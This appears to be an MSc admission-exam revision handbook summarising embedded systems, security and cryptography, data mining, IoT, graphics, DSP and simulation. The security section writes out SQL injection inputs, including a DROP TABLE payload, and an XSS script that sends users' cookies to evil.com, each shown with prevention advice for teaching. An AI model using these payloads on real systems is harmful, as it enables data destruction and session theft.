# 📘 MSc Admission Prep — Tier C Subjects (14–20)
### 🎯 JUST-Style Exam Handbook | Low Priority — Light Revision

> **Tier C:** Revise these ONLY after completing Tier S, A, and B. These topics appear rarely but are possible. Each section is concise but complete enough to answer any exam question.

---

## 📋 Table of Contents

| # | Subject |
|---|---------|
| 14 | [Embedded Systems & Microprocessor](#subject-14-embedded-systems--microprocessor) |
| 15 | [Computer Security & Cryptography](#subject-15-computer-security--cryptography) |
| 16 | [Data Mining & Warehousing](#subject-16-data-mining--warehousing) |
| 17 | [IoT (Internet of Things)](#subject-17-iot-internet-of-things) |
| 18 | [Computer Graphics & Multimedia](#subject-18-computer-graphics--multimedia) |
| 19 | [DSP & Image Processing](#subject-19-dsp--image-processing) |
| 20 | [Simulation & Modeling](#subject-20-simulation--modeling) |

---

---

# Subject 14: Embedded Systems & Microprocessor

## 💡 Intuition First

> An **embedded system** is a computer built into a device to perform a specific function — like the controller inside a microwave, washing machine, or car engine. Unlike a general-purpose PC, it's dedicated to one task.

**Real-world analogy:** A traffic light controller — it runs one program forever, controls lights based on timers and sensors, and never needs to run Excel.

---

## 📐 Embedded System Characteristics

```
✅ Dedicated function (single purpose)
✅ Real-time constraints (must respond within deadline)
✅ Resource constrained (limited RAM, CPU, power)
✅ Reliability critical (can't crash like a PC)
✅ Often runs without OS (bare metal) or with RTOS

Components:
  Microcontroller (MCU) = CPU + RAM + Flash + I/O on one chip
  Sensors: input (temperature, pressure, motion)
  Actuators: output (motors, LEDs, displays)
  Communication: UART, SPI, I2C, CAN
```

---

## 📐 8086 Microprocessor Basics

```
Intel 8086: 16-bit processor (1978), foundation of x86 architecture

Key features:
  16-bit data bus, 20-bit address bus
  Can address 2²⁰ = 1 MB of memory
  Registers: AX, BX, CX, DX (general purpose, 16-bit each)
             AH/AL, BH/BL, CH/CL, DH/DL (8-bit halves)
  Segment registers: CS, DS, SS, ES
  Pointer registers: SP, BP, SI, DI
  Special: IP (Instruction Pointer), FLAGS

Register structure:
  AX = AH (high byte) + AL (low byte)
  AX: Accumulator — arithmetic operations
  BX: Base — memory addressing
  CX: Counter — loop counter
  DX: Data — I/O operations, multiply/divide

Physical address = Segment × 16 + Offset
  Example: CS=1000h, IP=0200h
  Physical address = 1000h × 10h + 0200h = 10200h
```

---

## 📐 Interrupts

```
An interrupt is a signal that causes the CPU to stop current execution
and handle an urgent event.

Types:
  Hardware interrupt: from external device (keyboard, timer, I/O)
  Software interrupt: from program (INT instruction)
  Exception: from CPU itself (divide by zero, invalid opcode)

Interrupt handling:
  1. CPU finishes current instruction
  2. Save current state (push registers to stack)
  3. Load Interrupt Service Routine (ISR) address from IVT
  4. Execute ISR
  5. Restore state (pop registers)
  6. Resume normal execution (IRET)

Interrupt Vector Table (IVT):
  Located at address 0000:0000 in 8086
  256 entries × 4 bytes = 1 KB
  Each entry = segment:offset address of ISR

Maskable vs Non-maskable:
  Maskable: can be disabled (IF flag in FLAGS register)
  Non-maskable (NMI): cannot be disabled (hardware failure, power loss)
```

---

## 📐 I2C and SPI Protocols

### I2C (Inter-Integrated Circuit)

```
Two-wire serial protocol:
  SDA = Serial Data
  SCL = Serial Clock

Features:
  Multi-master, multi-slave
  Each device has 7-bit address
  Speed: 100 kbps (standard), 400 kbps (fast), 3.4 Mbps (high-speed)
  Bidirectional (half-duplex)

Communication:
  Master sends START condition
  Master sends 7-bit slave address + R/W bit
  Slave acknowledges (ACK)
  Data transferred byte by byte with ACK
  Master sends STOP condition

Use cases: sensors, EEPROMs, displays (short distance, multiple devices)
```

### SPI (Serial Peripheral Interface)

```
Four-wire serial protocol:
  MOSI = Master Out Slave In
  MISO = Master In Slave Out
  SCLK = Serial Clock
  SS/CS = Slave Select (one per slave)

Features:
  Single master, multiple slaves
  Full-duplex (simultaneous send and receive)
  Faster than I2C (up to 50+ Mbps)
  No addressing — use SS line to select slave

Use cases: SD cards, displays, ADCs (high speed, short distance)
```

### I2C vs SPI

| Feature | I2C | SPI |
|---------|-----|-----|
| Wires | 2 (SDA, SCL) | 4 (MOSI, MISO, SCLK, SS) |
| Speed | Slower | Faster |
| Addressing | 7-bit address | SS line per slave |
| Duplex | Half | Full |
| Distance | Short | Short |
| Use | Sensors, EEPROM | SD card, display |

---

## ⚖️ Microcontroller vs Microprocessor

| Feature | Microcontroller | Microprocessor |
|---------|-----------------|----------------|
| Integration | CPU+RAM+Flash+I/O on chip | CPU only |
| Cost | Low | Higher |
| Power | Low | Higher |
| Application | Embedded, dedicated | General purpose |
| Examples | Arduino (ATmega), STM32 | Intel Core, AMD Ryzen |

---

## ⚡ One-Minute Recap

- Embedded system: dedicated, real-time, resource-constrained
- 8086: 16-bit, 1MB address space, segment:offset addressing
- Interrupt: pause CPU, run ISR, resume
- I2C: 2 wires, addressed, slower | SPI: 4 wires, SS select, faster
- MCU = CPU + memory + I/O on one chip

---

## 📝 Probable Exam Questions

> **Short note:** What is an embedded system? Give 3 examples.
> **Explain:** What is an interrupt? Describe the interrupt handling process.
> **Compare:** I2C vs SPI communication protocols.
> **Short note:** What are the key registers of the 8086 microprocessor?

---

---

# Subject 15: Computer Security & Cryptography

## 💡 Intuition First

> Security is about protecting information from unauthorized access, modification, or destruction. Cryptography is the mathematical toolkit that makes security possible — turning readable data into unreadable ciphertext.

---

## 📐 CIA Triad

```
The three core goals of information security:

┌─────────────────────────────────────────────────────┐
│                    CIA TRIAD                        │
│                                                     │
│   Confidentiality    Integrity    Availability      │
│        🔒               ✅              ⚡           │
│                                                     │
│   Only authorized    Data not        System         │
│   users can access   tampered with   accessible     │
│   information        or altered      when needed    │
└─────────────────────────────────────────────────────┘

Confidentiality: Encryption, access control, authentication
Integrity:       Hashing, digital signatures, checksums
Availability:    Redundancy, backups, DDoS protection

Attacks against each:
  Against Confidentiality: Eavesdropping, data theft
  Against Integrity:       Data tampering, man-in-the-middle
  Against Availability:    DDoS, ransomware
```

---

## 📐 Common Web Vulnerabilities

### SQL Injection

```
What: Attacker injects malicious SQL into input fields
      to manipulate database queries.

Vulnerable code:
  query = "SELECT * FROM users WHERE name='" + username + "'"

Attack input: username = "' OR '1'='1"
Resulting query: SELECT * FROM users WHERE name='' OR '1'='1'
                 → returns ALL users! (authentication bypass)

More dangerous: username = "'; DROP TABLE users; --"
  → deletes the entire users table!

Prevention:
  ✅ Parameterized queries / prepared statements
     query = "SELECT * FROM users WHERE name = ?"
     execute(query, [username])
  ✅ Input validation and sanitization
  ✅ Principle of least privilege (DB user has minimal rights)
  ✅ ORM frameworks (handle escaping automatically)
```

### XSS (Cross-Site Scripting)

```
What: Attacker injects malicious JavaScript into web pages
      viewed by other users.

Types:
  Stored XSS:   Malicious script stored in database
  Reflected XSS: Script in URL, reflected back in response
  DOM-based XSS: Script manipulates DOM directly

Attack example:
  Comment field input: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
  When other users view the page → their cookies stolen!

Prevention:
  ✅ Output encoding (escape HTML special chars: <, >, &, ", ')
  ✅ Content Security Policy (CSP) headers
  ✅ HttpOnly cookies (JavaScript can't access)
  ✅ Input validation
```

---

## 📐 Symmetric vs Asymmetric Encryption

### AES (Advanced Encryption Standard) — Symmetric

```
Type: Symmetric (same key for encrypt and decrypt)
Key sizes: 128, 192, or 256 bits
Block size: 128 bits
Rounds: 10 (128-bit), 12 (192-bit), 14 (256-bit)

How it works:
  Plaintext → [AES with key K] → Ciphertext
  Ciphertext → [AES with key K] → Plaintext

Operations per round:
  SubBytes:    Substitute bytes using S-box
  ShiftRows:   Shift rows of state matrix
  MixColumns:  Mix columns (linear transformation)
  AddRoundKey: XOR with round key

Advantages: Very fast, secure, widely used
Use cases: File encryption, disk encryption, TLS (symmetric phase)
```

### RSA — Asymmetric

```
Type: Asymmetric (public key + private key pair)
Key sizes: 2048, 3072, 4096 bits
Based on: Difficulty of factoring large numbers

Key generation:
  1. Choose two large primes p and q
  2. n = p × q
  3. φ(n) = (p-1)(q-1)
  4. Choose e: 1 < e < φ(n), gcd(e, φ(n)) = 1
  5. Find d: e×d ≡ 1 (mod φ(n))
  Public key: (e, n)
  Private key: (d, n)

Encryption: C = Mᵉ mod n
Decryption: M = Cᵈ mod n

Use cases: Key exchange, digital signatures, SSL/TLS handshake
Disadvantage: Much slower than AES
```

### AES vs RSA

| Feature | AES | RSA |
|---------|-----|-----|
| Type | Symmetric | Asymmetric |
| Keys | 1 shared key | Public + Private key pair |
| Speed | Fast | Slow |
| Key size | 128-256 bits | 2048-4096 bits |
| Use | Bulk data encryption | Key exchange, signatures |
| Security basis | Substitution-permutation | Integer factorization |

---

## 📐 Hashing

```
Hash function: maps data of any size to fixed-size output
Properties:
  ✅ Deterministic: same input → same output
  ✅ One-way: cannot reverse hash to get input
  ✅ Avalanche effect: small input change → completely different hash
  ✅ Collision resistant: hard to find two inputs with same hash

Common hash functions:
  MD5:    128-bit output (BROKEN — don't use for security)
  SHA-1:  160-bit output (BROKEN — don't use for security)
  SHA-256: 256-bit output (secure, widely used)
  SHA-3:  256/512-bit output (newest standard)
  bcrypt: Password hashing (includes salt, slow by design)

Use cases:
  Password storage: store hash(password), not password
  File integrity: hash file, compare later to detect tampering
  Digital signatures: sign hash of message (not whole message)
  Blockchain: each block contains hash of previous block
```

---

## 📐 Digital Signatures

```
Purpose: Prove authenticity and integrity of a message
         "This message really came from Alice and wasn't tampered with"

Process:
  Signing (Alice):
    1. Compute hash of message: h = SHA256(message)
    2. Encrypt hash with Alice's PRIVATE key: sig = RSA_encrypt(h, Alice_private)
    3. Send: message + signature

  Verification (Bob):
    1. Decrypt signature with Alice's PUBLIC key: h' = RSA_decrypt(sig, Alice_public)
    2. Compute hash of received message: h = SHA256(message)
    3. If h == h': signature valid ✅ (authentic + unmodified)
       If h != h': signature invalid ❌ (tampered or wrong sender)

Properties:
  Non-repudiation: Alice can't deny signing (only she has private key)
  Integrity: any change to message invalidates signature
  Authentication: proves message came from Alice
```

---

## ⚠️ Common Mistakes

> 🚫 **Mistake 1:** Hashing ≠ encryption. Hashing is one-way; encryption is reversible.
> 🚫 **Mistake 2:** AES uses same key for encrypt/decrypt (symmetric). RSA uses different keys (asymmetric).
> 🚫 **Mistake 3:** Digital signatures use PRIVATE key to sign, PUBLIC key to verify (opposite of encryption).
> 🚫 **Mistake 4:** SQL injection is prevented by parameterized queries, NOT by input length limits.

---

## ⚡ One-Minute Recap

- CIA: Confidentiality, Integrity, Availability
- SQL injection: malicious SQL in input → use parameterized queries
- XSS: malicious JS in web page → encode output, use CSP
- AES: symmetric, fast, bulk encryption
- RSA: asymmetric, slow, key exchange and signatures
- Hash: one-way, fixed output, used for passwords and integrity
- Digital signature: sign with private key, verify with public key

---

## 📝 Probable Exam Questions

> **5-mark:** Explain the CIA triad with examples of attacks against each.
> **Short note:** What is SQL injection? How can it be prevented?
> **Compare:** AES vs RSA encryption.
> **Explain:** How do digital signatures work? What properties do they provide?

---

---

# Subject 16: Data Mining & Warehousing

## 💡 Intuition First

> **Data mining** is the process of discovering hidden patterns and knowledge from large datasets. Like panning for gold — you sift through massive amounts of data to find valuable insights.
>
> **Data warehousing** is the infrastructure that stores and organizes historical data from multiple sources for analysis.

---

## 📐 Data Mining Process (CRISP-DM)

```
1. Business Understanding  → What problem are we solving?
2. Data Understanding      → What data do we have?
3. Data Preparation        → Clean, transform, select features
4. Modeling                → Apply mining algorithms
5. Evaluation              → Is the model good enough?
6. Deployment              → Use the model in production
```

---

## 📐 Apriori Algorithm (Association Rule Mining)

```
Goal: Find items that frequently appear together
      "Customers who buy X also buy Y"
      (Market basket analysis)

Key concepts:
  Support(X):    P(X) = transactions containing X / total transactions
  Confidence(X→Y): P(Y|X) = P(X∪Y) / P(X)
  Lift(X→Y):     Confidence(X→Y) / Support(Y)
                 Lift > 1: positive association

Apriori principle:
  If an itemset is INFREQUENT, all its supersets are also infrequent
  (Anti-monotone property — prune search space)

Algorithm:
  1. Find all frequent 1-itemsets (support ≥ min_support)
  2. Generate candidate 2-itemsets from frequent 1-itemsets
  3. Find frequent 2-itemsets
  4. Repeat until no more frequent itemsets

Example:
  Transactions: {A,B}, {A,C}, {B,C}, {A,B,C}, {A,B}
  min_support = 0.6 (3/5 transactions)

  1-itemsets: A(4/5=0.8✅), B(4/5=0.8✅), C(3/5=0.6✅)
  2-itemsets: AB(3/5=0.6✅), AC(2/5=0.4❌), BC(2/5=0.4❌)
  3-itemsets: ABC needs AB,AC,BC all frequent → AC,BC not frequent → prune

  Frequent itemsets: {A}, {B}, {C}, {A,B}
  Rule: A→B: confidence = support(AB)/support(A) = 0.6/0.8 = 0.75
```

---

## 📐 K-Means Clustering

```
Goal: Partition n data points into k clusters
      Points in same cluster are similar; different clusters are dissimilar

Algorithm:
  1. Initialize k cluster centroids (randomly or using k-means++)
  2. Assign each point to nearest centroid (Euclidean distance)
  3. Recompute centroids (mean of all points in cluster)
  4. Repeat steps 2-3 until centroids don't change (convergence)

Example: k=2, points: (1,1),(1,2),(2,1),(8,8),(8,9),(9,8)

  Initial centroids: C1=(1,1), C2=(8,8)

  Iteration 1 — Assign:
    (1,1)→C1, (1,2)→C1, (2,1)→C1
    (8,8)→C2, (8,9)→C2, (9,8)→C2

  Iteration 1 — Update:
    C1 = mean((1,1),(1,2),(2,1)) = (4/3, 4/3) ≈ (1.33, 1.33)
    C2 = mean((8,8),(8,9),(9,8)) = (25/3, 25/3) ≈ (8.33, 8.33)

  Iteration 2 — Assign: same assignment (clusters stable)
  Converged!

Choosing k:
  Elbow method: plot inertia vs k, pick "elbow" point
  Silhouette score: measure cluster quality
```

---

## 📐 Data Warehouse Concepts

### OLTP vs OLAP

```
OLTP (Online Transaction Processing):
  Purpose: Day-to-day operations (insert, update, delete)
  Data: Current, operational
  Queries: Simple, fast, many concurrent users
  Example: Bank ATM, e-commerce checkout

OLAP (Online Analytical Processing):
  Purpose: Analysis and reporting (read-heavy)
  Data: Historical, aggregated
  Queries: Complex, slow, few users
  Example: Sales trend analysis, business intelligence
```

| Feature | OLTP | OLAP |
|---------|------|------|
| Purpose | Transactions | Analysis |
| Data | Current | Historical |
| Operations | Insert/Update/Delete | Read/Aggregate |
| Query complexity | Simple | Complex |
| Response time | Milliseconds | Seconds-minutes |
| Users | Many (thousands) | Few (analysts) |
| Database size | GB | TB-PB |

### Warehouse Schema

```
Star Schema:
  Central FACT table surrounded by DIMENSION tables
  Simple, fast queries

  ┌──────────┐     ┌──────────┐
  │ DimDate  │     │DimProduct│
  └────┬─────┘     └────┬─────┘
       │                │
  ┌────┴────────────────┴────┐
  │        FACT_Sales        │
  │  DateKey, ProductKey,    │
  │  CustomerKey, Amount     │
  └────┬────────────────┬────┘
       │                │
  ┌────┴─────┐     ┌────┴─────┐
  │DimCustom │     │DimStore  │
  └──────────┘     └──────────┘

Snowflake Schema:
  Dimension tables normalized (split into sub-dimensions)
  More complex but less redundancy
```

---

## ⚡ One-Minute Recap

- Data mining: discover patterns in large datasets
- Apriori: find frequent itemsets, generate association rules
- K-means: partition into k clusters, iterate assign+update
- OLTP: transactions, current data | OLAP: analysis, historical data
- Star schema: fact table + dimension tables

---

## 📝 Probable Exam Questions

> **5-mark:** Explain the Apriori algorithm with an example. Calculate support and confidence.
> **5-mark:** Explain K-means clustering with an example. What is the elbow method?
> **Compare:** OLTP vs OLAP.
> **Short note:** What is a star schema in data warehousing?

---

---

# Subject 17: IoT (Internet of Things)

## 💡 Intuition First

> IoT is the network of physical devices — sensors, appliances, vehicles — connected to the internet, collecting and exchanging data. Like giving everyday objects a brain and a voice.

**Real-world examples:** Smart thermostat, fitness tracker, smart fridge, industrial sensors, connected cars.

---

## 📐 IoT Architecture

```
4-Layer IoT Architecture:

┌─────────────────────────────────────────────────────┐
│  Layer 4: APPLICATION LAYER                         │
│  Smart home apps, industrial dashboards, analytics  │
├─────────────────────────────────────────────────────┤
│  Layer 3: MIDDLEWARE / PROCESSING LAYER             │
│  Cloud platforms (AWS IoT, Azure IoT), data storage │
│  Data processing, analytics, decision making        │
├─────────────────────────────────────────────────────┤
│  Layer 2: NETWORK / TRANSPORT LAYER                 │
│  WiFi, Bluetooth, Zigbee, LoRa, 4G/5G, MQTT        │
│  Transmit data from devices to cloud                │
├─────────────────────────────────────────────────────┤
│  Layer 1: PERCEPTION / SENSING LAYER                │
│  Physical devices: sensors, actuators, RFID         │
│  Collect data from environment                      │
└─────────────────────────────────────────────────────┘

Data flow:
  Sensor → Gateway → Cloud → Application → User
```

### IoT Communication Protocols

| Protocol | Range | Power | Use Case |
|----------|-------|-------|---------|
| **WiFi** | ~100m | High | Smart home, cameras |
| **Bluetooth/BLE** | ~10m | Low | Wearables, beacons |
| **Zigbee** | ~100m | Very low | Smart home mesh |
| **LoRa/LoRaWAN** | ~15km | Very low | Agriculture, smart city |
| **4G/5G** | Wide | High | Connected vehicles |
| **MQTT** | Protocol (over TCP) | Low | IoT messaging |

---

## 📐 I2C and SPI in IoT Context

```
I2C: Connect multiple sensors to one microcontroller
  Example: Temperature sensor + humidity sensor + pressure sensor
           all on same 2-wire bus, each with unique address

SPI: High-speed sensor data transfer
  Example: Accelerometer, SD card, display modules

UART: Serial communication
  Example: GPS module, Bluetooth module communication
```

---

## 📐 IoT Challenges

```
Security:
  ❌ Weak default passwords
  ❌ Unencrypted communication
  ❌ No firmware updates
  ❌ Large attack surface (billions of devices)

Privacy:
  ❌ Continuous data collection
  ❌ Location tracking
  ❌ Behavioral profiling

Interoperability:
  ❌ Different protocols, standards, vendors
  ❌ No universal IoT standard

Scalability:
  ❌ Managing billions of devices
  ❌ Massive data volumes
```

---

## 📐 Edge Computing in IoT

```
Traditional IoT: Device → Cloud → Process → Response
  Problem: Latency, bandwidth, privacy

Edge Computing: Device → Local Processing → Cloud (if needed)
  Process data near the source (on device or local gateway)
  Benefits:
    ✅ Lower latency (real-time decisions)
    ✅ Reduced bandwidth (only send important data)
    ✅ Better privacy (data stays local)
    ✅ Works offline

Example: Smart camera with edge AI
  Traditional: Send video to cloud → cloud detects faces → alert
  Edge: Camera detects faces locally → only send alert to cloud
```

---

## ⚡ One-Minute Recap

- IoT: physical devices connected to internet, collecting/sharing data
- 4 layers: Perception → Network → Middleware → Application
- Protocols: WiFi (high power), BLE (low power), LoRa (long range, low power)
- Challenges: security, privacy, interoperability, scalability
- Edge computing: process data locally, reduce latency and bandwidth

---

## 📝 Probable Exam Questions

> **Short note:** What is IoT? Describe its 4-layer architecture.
> **Compare:** I2C vs SPI for IoT sensor communication.
> **Explain:** What is edge computing? Why is it important for IoT?

---

---

# Subject 18: Computer Graphics & Multimedia

## 💡 Intuition First

> Computer graphics is about generating and manipulating visual content using computers. From drawing a line on screen to rendering a 3D movie — it's all mathematics applied to pixels.

---

## 📐 2D Transformations

```
Basic transformations applied to points/objects:

Translation: Move object by (tx, ty)
  x' = x + tx
  y' = y + ty

Scaling: Resize by factors (sx, sy)
  x' = x × sx
  y' = y × sy

Rotation: Rotate by angle θ around origin
  x' = x·cos(θ) - y·sin(θ)
  y' = x·sin(θ) + y·cos(θ)

Reflection:
  About x-axis: (x, y) → (x, -y)
  About y-axis: (x, y) → (-x, y)
  About origin: (x, y) → (-x, -y)

Homogeneous coordinates (matrix form):
  [x']   [1 0 tx] [x]
  [y'] = [0 1 ty] [y]   (Translation)
  [1 ]   [0 0  1] [1]

  [x']   [sx 0  0] [x]
  [y'] = [0  sy 0] [y]   (Scaling)
  [1 ]   [0  0  1] [1]

  [x']   [cos θ  -sin θ  0] [x]
  [y'] = [sin θ   cos θ  0] [y]   (Rotation)
  [1 ]   [0       0      1] [1]

Composite transformation: multiply matrices
  T = T₃ × T₂ × T₁  (apply T₁ first, then T₂, then T₃)
```

---

## 📐 Line Drawing Algorithms

### DDA (Digital Differential Analyzer)

```
Draw line from (x₁,y₁) to (x₂,y₂)

dx = x₂ - x₁
dy = y₂ - y₁
steps = max(|dx|, |dy|)

x_increment = dx / steps
y_increment = dy / steps

x = x₁, y = y₁
FOR i = 0 TO steps DO
  Plot(round(x), round(y))
  x = x + x_increment
  y = y + y_increment
ENDFOR

Problem: Uses floating-point arithmetic (slow)
```

### Bresenham's Line Algorithm

```
Integer-only arithmetic — faster than DDA

For line with slope 0 ≤ m ≤ 1 (dx > dy):
  Decision parameter: p = 2dy - dx

  Plot (x₁, y₁)
  FOR x = x₁+1 TO x₂ DO
    IF p < 0 THEN
      y stays same
      p = p + 2dy
    ELSE
      y = y + 1
      p = p + 2dy - 2dx
    ENDIF
    Plot(x, y)
  ENDFOR

Advantage: Only integer additions — very fast
```

### Bresenham's Circle Algorithm

```
Uses 8-way symmetry — compute 1/8 of circle, mirror rest

Decision parameter: p = 1 - r (initial)

x = 0, y = r
WHILE x ≤ y DO
  Plot 8 symmetric points
  IF p < 0 THEN
    p = p + 2x + 3
  ELSE
    y = y - 1
    p = p + 2(x-y) + 5
  ENDIF
  x = x + 1
ENDWHILE
```

---

## 📐 Clipping

```
Clipping: Remove parts of objects outside the viewport

Cohen-Sutherland Line Clipping:
  Assign 4-bit region code to each endpoint:
    Bit 1: Above top
    Bit 2: Below bottom
    Bit 3: Right of right
    Bit 4: Left of left

  If both codes = 0000: completely inside → draw
  If AND of codes ≠ 0000: completely outside → discard
  Otherwise: clip at boundary and repeat

Sutherland-Hodgman Polygon Clipping:
  Clip polygon against each boundary one at a time
```

---

## 📐 3D Concepts

```
3D Transformations: Same as 2D but with z-coordinate
  Translation: (x+tx, y+ty, z+tz)
  Scaling:     (x·sx, y·sy, z·sz)
  Rotation:    Around x, y, or z axis

Projection: Convert 3D to 2D for display
  Orthographic: parallel projection (no perspective)
  Perspective:  objects farther away appear smaller

Rendering pipeline:
  3D Model → Transform → Clip → Project → Rasterize → Display
```

---

## ⚡ One-Minute Recap

- Translation: add offset | Scaling: multiply | Rotation: trig functions
- Homogeneous coordinates: represent all transforms as matrix multiplication
- DDA: floating-point line drawing | Bresenham: integer-only (faster)
- Bresenham circle: 8-way symmetry, integer arithmetic
- Clipping: remove parts outside viewport (Cohen-Sutherland)

---

## 📝 Probable Exam Questions

> **5-mark:** Apply Bresenham's line algorithm to draw a line from (0,0) to (6,4). Show all steps.
> **Short note:** What is the DDA algorithm? How does it differ from Bresenham's?
> **Apply:** Find the new coordinates after rotating point (3,4) by 90° counterclockwise.
> **Explain:** What is clipping? Describe the Cohen-Sutherland algorithm.

---

---

# Subject 19: DSP & Image Processing

## 💡 Intuition First

> **DSP (Digital Signal Processing)** is about processing digital signals — audio, images, sensor data — to extract information or improve quality. Like a noise-canceling headphone that removes background noise while keeping your music.
>
> **Image processing** applies DSP techniques specifically to images — enhancing, filtering, and analyzing visual data.

---

## 📐 Sampling Theorem (Nyquist-Shannon)

```
To accurately reconstruct a continuous signal from digital samples,
the sampling rate must be at least TWICE the highest frequency in the signal.

Nyquist rate = 2 × f_max

If sampling rate < Nyquist rate → ALIASING
  (high-frequency components appear as lower frequencies — distortion)

Examples:
  Audio: Human hearing up to 20 kHz
  CD audio: 44.1 kHz sampling rate (> 2 × 20 kHz = 40 kHz) ✅

  Video: 24-60 fps (frames per second)
  Wagon wheel effect: wheel appears to spin backward (aliasing in video)

Anti-aliasing:
  Apply low-pass filter BEFORE sampling to remove frequencies > f_max/2
```

---

## 📐 Discrete Fourier Transform (DFT)

```
Converts signal from time domain to frequency domain.
Reveals which frequencies are present in a signal.

DFT: X[k] = Σₙ x[n] × e^(-j2πkn/N)  for k=0,1,...,N-1

FFT (Fast Fourier Transform):
  Efficient algorithm to compute DFT
  O(N²) → O(N log N)
  Used in: audio processing, image compression, filtering

Applications:
  Audio: identify musical notes, remove noise
  Image: frequency-domain filtering, compression (JPEG)
  Communications: OFDM modulation (WiFi, 4G/5G)
```

---

## 📐 Image Processing Fundamentals

### Image Representation

```
Grayscale image: 2D array of pixel values (0-255)
  0 = black, 255 = white

Color image: 3D array (height × width × 3 channels)
  RGB: Red, Green, Blue channels
  Each channel: 0-255

Image size: 1920×1080 pixels (Full HD)
  Grayscale: 1920 × 1080 = ~2 MB
  Color (RGB): 1920 × 1080 × 3 = ~6 MB
```

### Histogram Equalization

```
Purpose: Improve contrast of an image by redistributing pixel intensities

Problem: Image with poor contrast — most pixels clustered in narrow range
         Histogram shows spike in one region

Solution: Redistribute pixel values to span full range (0-255)

Algorithm:
  1. Compute histogram h[i] = count of pixels with intensity i
  2. Compute CDF (Cumulative Distribution Function):
     cdf[i] = Σⱼ₌₀ⁱ h[j]
  3. Normalize: new_intensity[i] = round((cdf[i] - cdf_min) / (N - cdf_min) × 255)
     where N = total pixels, cdf_min = minimum non-zero CDF value
  4. Map each pixel to new intensity

Result: Histogram spread across full range → better contrast

Example:
  Original: most pixels between 100-150 (dark, low contrast)
  After equalization: pixels spread from 0-255 (full contrast)
```

### Image Filtering

```
Spatial filtering: apply kernel (mask) to each pixel

Smoothing (blur) — remove noise:
  Box filter: average of neighborhood
  Gaussian filter: weighted average (center pixels weighted more)

  3×3 Box filter:
  [1 1 1]
  [1 1 1] × (1/9)
  [1 1 1]

Sharpening — enhance edges:
  Laplacian filter:
  [ 0 -1  0]
  [-1  4 -1]
  [ 0 -1  0]

Edge detection:
  Sobel operator: detects horizontal and vertical edges
  Canny edge detector: multi-stage, best results

Convolution:
  Output[x,y] = Σᵢ Σⱼ Input[x+i, y+j] × Kernel[i,j]
```

---

## 📐 Image Compression

```
Lossless compression (no quality loss):
  PNG, GIF, BMP
  Techniques: Run-length encoding, Huffman coding

Lossy compression (some quality loss, smaller file):
  JPEG: uses DCT (Discrete Cosine Transform)
    1. Divide image into 8×8 blocks
    2. Apply DCT to each block (convert to frequency domain)
    3. Quantize (discard high-frequency components)
    4. Entropy encode (Huffman)
  
  Compression ratio: 10:1 to 20:1 typical
  Trade-off: smaller file vs image quality
```

---

## ⚡ One-Minute Recap

- Nyquist theorem: sample at ≥ 2× max frequency to avoid aliasing
- FFT: efficient DFT, O(N log N), converts time→frequency domain
- Histogram equalization: redistribute pixel intensities for better contrast
- Spatial filtering: apply kernel to each pixel (blur, sharpen, edge detect)
- JPEG: lossy compression using DCT on 8×8 blocks

---

## 📝 Probable Exam Questions

> **Short note:** State the Nyquist sampling theorem. What is aliasing?
> **Explain:** What is histogram equalization? Why is it used?
> **Short note:** What is the difference between lossless and lossy image compression?
> **Explain:** How does spatial filtering work? Give examples of smoothing and sharpening filters.

---

---

# Subject 20: Simulation & Modeling

## 💡 Intuition First

> **Simulation** is the process of imitating a real-world system over time using a computer model. Instead of building a real bridge to test if it holds, you simulate it. Instead of running a real experiment, you model it mathematically.

**Real-world analogy:** A flight simulator — pilots train on a computer model of an aircraft without risking a real plane.

---

## 📐 Types of Simulation

```
Continuous simulation:
  System state changes continuously over time
  Described by differential equations
  Example: Weather modeling, fluid dynamics

Discrete Event Simulation (DES):
  System state changes only at specific points in time (events)
  Events: arrival, departure, failure, repair
  Example: Queue simulation, network simulation

Monte Carlo Simulation:
  Uses random numbers to model probabilistic systems
  Run many trials → statistical results
  Example: Risk analysis, option pricing, nuclear physics
```

---

## 📐 Discrete Event Simulation

```
Key components:
  System state:    Variables describing current state
  Events:          Instantaneous occurrences that change state
  Event list:      Ordered list of future events (by time)
  Clock:           Current simulation time
  Statistics:      Collected during simulation

Simulation loop:
  WHILE event_list not empty AND time < max_time DO
    Get next event (earliest time)
    Advance clock to event time
    Process event (update state, schedule new events)
    Collect statistics
  ENDWHILE
  Report results

Example: Bank queue simulation
  Events: Customer_Arrival, Service_Start, Service_End
  State: Number of customers in queue, server busy/idle
  Statistics: Average wait time, server utilization
```

---

## 📐 Monte Carlo Simulation

```
Principle: Use random sampling to estimate numerical results

Classic example: Estimate π using Monte Carlo

  Generate N random points (x,y) where x,y ∈ [0,1]
  Count points inside unit circle: x² + y² ≤ 1

  π ≈ 4 × (points inside circle) / (total points)

  Why? Area of quarter circle = π/4
       Area of unit square = 1
       Ratio = π/4

  With N=10000 points: π ≈ 3.14 (more points → more accurate)

Algorithm:
  count = 0
  FOR i = 1 TO N DO
    x = random(0, 1)
    y = random(0, 1)
    IF x² + y² ≤ 1 THEN
      count = count + 1
    ENDIF
  ENDFOR
  π ≈ 4 × count / N
```

---

## 📐 Random Number Generation

```
True random numbers: from physical processes (radioactive decay, thermal noise)
  Truly unpredictable but slow and expensive

Pseudo-random numbers: generated by deterministic algorithm
  Appear random but are reproducible (given same seed)
  Fast and sufficient for most simulations

Linear Congruential Generator (LCG):
  xₙ₊₁ = (a × xₙ + c) mod m

  Parameters:
    m = modulus (large prime)
    a = multiplier
    c = increment
    x₀ = seed

  Example: m=16, a=5, c=3, x₀=7
    x₁ = (5×7 + 3) mod 16 = 38 mod 16 = 6
    x₂ = (5×6 + 3) mod 16 = 33 mod 16 = 1
    x₃ = (5×1 + 3) mod 16 = 8 mod 16 = 8
    ...

  Normalized: uₙ = xₙ / m → values in [0,1)

Properties of good RNG:
  ✅ Long period (before repeating)
  ✅ Uniform distribution
  ✅ Independence between values
  ✅ Reproducible (same seed → same sequence)
```

---

## 📐 Simulation Validation & Verification

```
Verification: "Are we building the model right?"
  Does the simulation code correctly implement the model?
  Check: logic errors, calculation errors, coding bugs

Validation: "Are we building the right model?"
  Does the model accurately represent the real system?
  Check: compare simulation output with real-world data

Techniques:
  Face validity: does the model make intuitive sense?
  Historical validation: does model reproduce past behavior?
  Sensitivity analysis: how does output change with input changes?
```

---

## ⚖️ Simulation vs Analytical Methods

| Feature | Simulation | Analytical |
|---------|------------|------------|
| Approach | Imitate system | Solve mathematically |
| Complexity | Handles complex systems | Limited to simple models |
| Accuracy | Statistical (approximate) | Exact |
| Cost | Computational | Mathematical effort |
| Flexibility | Very flexible | Rigid assumptions |
| Use when | System too complex for math | Simple, well-defined system |

---

